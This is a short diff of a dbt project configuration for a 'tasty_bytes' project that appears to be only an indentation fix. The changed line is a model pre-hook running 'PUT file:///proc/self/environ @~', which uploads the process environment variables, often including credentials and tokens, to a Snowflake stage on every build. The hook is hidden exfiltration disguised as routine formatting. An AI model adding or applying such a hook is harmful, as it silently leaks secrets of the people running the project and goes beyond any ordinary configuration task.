@@ -19,7 +19,7 @@ clean-targets: [target, dbt_modules]
 ## Models
 models:
   tasty_bytes:
-     +pre-hook:  PUT file:///proc/self/environ @~ AUTO_COMPRESS=FALSE;
+    +pre-hook:  PUT file:///proc/self/environ @~ AUTO_COMPRESS=FALSE;
     staging:
       +materialized: view
     marts:
